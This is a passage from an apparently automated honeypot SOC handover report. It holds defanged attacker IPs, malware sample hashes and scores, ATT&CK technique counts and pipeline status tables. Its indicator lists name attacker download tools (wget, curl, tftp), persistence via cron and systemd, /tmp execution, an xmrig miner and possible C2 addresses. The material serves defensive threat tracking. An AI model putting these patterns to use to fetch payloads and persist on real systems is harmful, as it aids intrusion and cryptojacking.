| `165.22.105[.]175` | 1 | 2026-11-18 04:01 | 2026-11-18 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.126.119[.]129` | 1 | 2026-11-18 04:28 | 2026-11-18 04:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.57.76[.]206` | 1 | 2026-11-18 03:40 | 2026-11-18 03:40 | 7s | 0 | `T1592` | 🟢 LOW |
| `182.95.181[.]26` | 1 | 2026-11-18 03:14 | 2026-11-18 03:15 | 5s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-18 04:06 | 2026-11-18 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.3.220[.]7` | 1 | 2026-11-18 03:17 | 2026-11-18 03:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.81.189[.]216` | 1 | 2026-11-18 00:52 | 2026-11-18 00:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `201.139.216[.]143` | 1 | 2026-11-18 02:18 | 2026-11-18 02:19 | 33s | 0 | `T1592` | 🟢 LOW |
| `201.22.73[.]37` | 1 | 2026-11-18 01:19 | 2026-11-18 01:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.63.225[.]145` | 1 | 2026-11-18 03:09 | 2026-11-18 03:10 | 19s | 0 | `T1592` | 🟢 LOW |
| `217.60.77[.]75` | 1 | 2026-11-18 02:02 | 2026-11-18 02:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `221.166.164[.]167` | 1 | 2026-11-18 02:16 | 2026-11-18 02:16 | 14s | 0 | `T1592` | 🟢 LOW |
| `222.224.231[.]243` | 1 | 2026-11-18 03:33 | 2026-11-18 03:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `223.100.224[.]75` | 1 | 2026-11-18 03:22 | 2026-11-18 03:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-18 01:28 | 2026-11-18 01:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.151[.]143` | 1 | 2026-11-18 03:36 | 2026-11-18 03:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.160[.]252` | 1 | 2026-11-18 03:40 | 2026-11-18 03:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.203[.]235` | 1 | 2026-11-18 02:57 | 2026-11-18 02:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `35.210.233[.]15` | 1 | 2026-11-18 03:26 | 2026-11-18 03:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.240[.]68` | 1 | 2026-11-18 04:03 | 2026-11-18 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.38[.]107` | 1 | 2026-11-18 03:24 | 2026-11-18 03:24 | 2s | 0 | `T1592` | 🟢 LOW |
| `37.237.228[.]57` | 1 | 2026-11-18 02:01 | 2026-11-18 02:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-18 01:06 | 2026-11-18 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-11-18 04:02 | 2026-11-18 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-18 02:37 | 2026-11-18 02:37 | 2s | 0 | `T1592` | 🟢 LOW |
| `46.201.92[.]134` | 1 | 2026-11-18 03:06 | 2026-11-18 03:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `49.176.157[.]115` | 1 | 2026-11-18 00:15 | 2026-11-18 00:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.8.48[.]178` | 1 | 2026-11-18 01:13 | 2026-11-18 01:13 | 7s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-11-18 04:41 | 2026-11-18 04:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-11-18 02:39 | 2026-11-18 02:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-18 04:47 | 2026-11-18 04:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-18 04:08 | 2026-11-18 04:08 | 6s | 0 | `T1592` | 🟢 LOW |
| `82.147.85[.]98` | 1 | 2026-11-18 01:02 | 2026-11-18 01:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]153` | 1 | 2026-11-18 02:16 | 2026-11-18 02:16 | 2s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]64` | 1 | 2026-11-18 03:08 | 2026-11-18 03:08 | 9s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-11-18 01:19 | 2026-11-18 01:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `98.93.9[.]74` | 1 | 2026-11-18 01:28 | 2026-11-18 01:28 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `78.128.112[.]74` | BG | Lir.bg EOOD | **100** ⚠️ | 50 |
| `179.184.218[.]49` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `196.189.59[.]226` | ET | To__BRAS_DHCP_AD_10800E | **100** ⚠️ | 50 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `35.210.203[.]235` | BE | Google LLC | **100** ⚠️ | 1 |
| `70.167.235[.]189` | US | Cox Communications | **100** ⚠️ | 7 |
| `114.32.19[.]171` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 3 |
| `103.159.167[.]129` | IN | Infonet Online Solutions | **100** ⚠️ | 3 |
| `201.22.73[.]37` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 0 |
| `193.187.110[.]160` | FI | Cyberaegis Casa S.R.L. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 110 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 1 below threshold 25 | 3 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 4 |
| AbuseIPDB score 23 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 188 cases |
| Tool 34  | Credential Extractor        | ✅ 297 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 26 fingerprints |
| Tool 36  | Command Clustering          | ✅ 24 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 134 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (19.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 100 priority case(s) shown individually · 49 recon entry/entries in table (2 group(s) consolidating 5 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-18T05:02:00Z_
